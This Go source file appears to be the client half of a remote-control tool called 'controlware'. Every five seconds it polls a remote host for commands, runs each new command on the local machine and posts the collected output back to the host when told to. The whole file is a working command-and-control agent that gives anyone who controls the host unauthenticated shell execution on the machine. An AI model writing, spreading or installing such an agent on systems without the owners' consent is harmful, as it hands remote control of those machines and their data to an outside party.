package client

import (
	"bytes"
	"controlware/shared"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"golang.org/x/exp/slices"
)

var (
	executedCommandIds []string = make([]string, 0)
	output             string   = "> ### start\n"
)

func Run(host string) {
	for {
		get(host)
		time.Sleep(time.Second * 5)
	}
}

func fmterr(title string, err error) string {
	str := fmt.Sprintf("! error %v - %v\n", title, err)
	log.Println(str)
	return str
}

func get(host string) {
	r, err := http.Get(host + "/commands/get")
	if err != nil {
		output += fmterr("getting commands", err)
		return
	}

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		output += fmterr("reading body of commands", err)
		return
	}

	commands := make([]shared.Command, 0)
	err = json.Unmarshal(body, &commands)
	if err != nil {
		output += fmterr(fmt.Sprintf("json decoding %v", body), err)
		return
	}

	for _, command := range commands {
		if slices.Contains(executedCommandIds, command.Id) {
			continue
		}
		executedCommandIds = append(executedCommandIds, command.Id)
		executeCommand(host, command.Cmd)
	}
}

func executeCommand(host, command string) {
	if strings.HasPrefix(command, "### ") {
		executeShebang(host, strings.Replace(command, "### ", "", 1))
	} else {
		splitted := strings.Split(command, " ")
		cmd := exec.Command(splitted[0], splitted[1:]...)

		out := bytes.Buffer{}
		cmd.Stdout = &out

		err := cmd.Run()
		if err != nil {
			output += fmterr(fmt.Sprintf("command failed %s", command), err)
			return
		}

		output += fmt.Sprintf("> %s: %s \n", command, out.String())
	}
}

func executeShebang(host string, shebang string) {
	output += fmt.Sprintf("> ### %s\n", shebang)
	if shebang == "output" {
		r := strings.NewReader(output)
		http.Post(host+"/shebangs/output", "plain/text", r)
		output = "> ### start, output cleared\n"
	} else {
		output += fmterr(fmt.Sprintf("shebang failed %s", shebang), nil)
	}
}
